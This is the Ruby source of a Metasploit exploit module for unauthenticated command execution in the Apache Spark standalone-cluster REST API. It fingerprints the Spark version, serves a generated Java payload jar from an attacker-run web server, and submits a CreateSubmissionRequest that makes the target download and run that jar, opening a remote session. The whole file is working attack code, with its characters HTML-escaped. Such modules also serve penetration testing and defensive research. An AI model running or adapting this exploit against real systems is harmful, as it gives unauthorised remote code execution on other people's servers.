# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Spark Unauthenticated Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits an unauthenticated command execution vulnerability in Apache Spark with standalone cluster mode through REST API.
          It uses the function CreateSubmissionRequest to submit a malious java class and trigger it.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;aRe00t&#039;,                            # Proof of concept
          &#039;Green-m <greenm.xxoo[at]gmail.com>&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://www.jianshu.com/p/a080cb323832&#039;],
          [&#039;URL&#039;, &#039;https://github.com/vulhub/vulhub/tree/master/spark/unacc&#039;]
        ],
      &#039;Platform&#039;       => &#039;java&#039;,
      &#039;Arch&#039;           => [ARCH_JAVA],
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Dec 12 2017&#039;,
      &#039;DefaultTarget&#039;  => 0,
      &#039;Notes&#039;          =>
        {
          &#039;SideEffects&#039; => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          &#039;Stability&#039;   => [ CRASH_SAFE ],
          &#039;Reliability&#039; => [ REPEATABLE_SESSION]
        }
    ))

    register_options [
      Opt::RPORT(6066),
      OptInt.new(&#039;HTTPDELAY&#039;, [true, &#039;Number of seconds the web server will wait before termination&#039;, 10])
    ]

  end

  def check
    return CheckCode::Detected if get_version
    CheckCode::Unknown
  end

  def primer
    path = service.resources.keys[0]
    binding_ip = srvhost_addr

    proto = datastore[&#039;SSL&#039;] ? &#039;https&#039; : &#039;http&#039;
    payload_uri = "#{proto}://#{binding_ip}:#{datastore[&#039;SRVPORT&#039;]}/#{path}"

    send_payload(payload_uri)
  end

  def exploit
    fail_with(Failure::Unknown, "Something went horribly wrong and we couldn&#039;t continue to exploit.") unless get_version

    vprint_status("Generating payload ...")
    @pl = generate_payload.encoded_jar(random:true)
    print_error("Failed to generate the payload.") unless @pl

    print_status("Starting up our web service ...")
    Timeout.timeout(datastore[&#039;HTTPDELAY&#039;]) { super }
  rescue Timeout::Error
  end

  def get_version
    @version = nil

    res = send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path),
      &#039;method&#039;        => &#039;GET&#039;
    )

    unless res
      vprint_bad("#{peer} - No response. ")
      return false
    end

    if res.code == 401
      print_bad("#{peer} - Authentication required.")
      return false
    end

    unless res.code == 400
      return false
    end

    res_json = res.get_json_document
    @version = res_json[&#039;serverSparkVersion&#039;]

    if @version.nil?
      vprint_bad("#{peer} - Cannot parse the response, seems like it&#039;s not Spark REST API.")
      return false
    end

    true
  end

  def send_payload(payload_uri)
    rand_appname   = Rex::Text.rand_text_alpha_lower(8..16)

    data =
    {
      "action"                    => "CreateSubmissionRequest",
      "clientSparkVersion"        => @version.to_s,
      "appArgs"                   => [],
      "appResource"               => payload_uri.to_s,
      "environmentVariables"      => {"SPARK_ENV_LOADED" => "1"},
      "mainClass"                 => "#{@pl.substitutions["metasploit"]}.Payload",
      "sparkProperties"           =>
      {
        "spark.jars"              => payload_uri.to_s,
        "spark.driver.supervise"  => "false",
        "spark.app.name"          => rand_appname.to_s,
        "spark.eventLog.enabled"  => "true",
        "spark.submit.deployMode" => "cluster",
        "spark.master"            => "spark://#{rhost}:#{rport}"
      }
    }

    res = send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/v1/submissions/create"),
      &#039;method&#039;        => &#039;POST&#039;,
      &#039;ctype&#039;         => &#039;application/json;charset=UTF-8&#039;,
      &#039;data&#039;          => data.to_json
    )

  end

  # Handle incoming requests
  def on_request_uri(cli, request)
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    send_response(cli, @pl)
  end
end

